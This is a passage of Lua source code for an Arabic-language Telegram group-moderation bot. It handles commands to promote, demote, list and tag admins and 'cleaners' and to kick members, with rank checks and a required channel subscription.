if text and text:match("^رفع ادمن عام @(.*)$") and Constructor(msg) then
local username = text:match("^رفع ادمن عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'moall'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته ادمن عام'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع ادمن عام (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع ادمن عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'moall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل ادمن عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'moall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الادمنه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل ادمن عام @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل ادمن عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'moall'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الادمنه'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل ادمن عام (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل ادمن عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'moall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الادمنه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من الادمنه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text ==("رفع الادمنيه") and Manager(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_," ♤ لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_," ♤ تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ♤ تم مسح الادمنيه')
end
if text == ("الادمنيه") and Manager(msg) then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n ♤ قائمة الادمنيه \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n ♤ وينكم تعالو يريدوكم بالجروب \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and Manager(msg) then
local username = text:match("^رفع ادمن @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته ادمن'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^رفع ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and Manager(msg) then
local username = text:match("^تنزيل ادمن @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الادمنيه'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^تنزيل ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == 'مسح المنظفين' and BasicConstructor(msg) then
database:del(bot_id..'S00F4:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ♤ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
t = "\n ♤ قائمة المنظفين \n━━━━━━𝓓𝓡𝓖━━━━━━\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد المنظفين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنظفين") or text == ("صيح المنظفين") then
local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
t = "\n ♤ وينكم تعالو يريدوكم بالجروب \n━━━━━━𝓓𝓡𝓖━━━━━━\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد منظفيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منظف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته منظف'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منظف @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المنظفين'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ♤ عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ♤  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ♤ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
statusk  = '\n ♤ تم طرد الـعـضو '
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ♤ عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ♤  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ♤ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
statusk  = '\n ♤ تم طرد الـعـضو '
texts = usertext..statusk
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, ' ♤ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ♤ تم تعطيل الطرد') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ♤ عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ♤ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ♤ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
chat_kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
 statusk  = '\n ♤ تم طرد الـعـضو '
send(msg.chat_id_, msg.id_, usertext..statusk)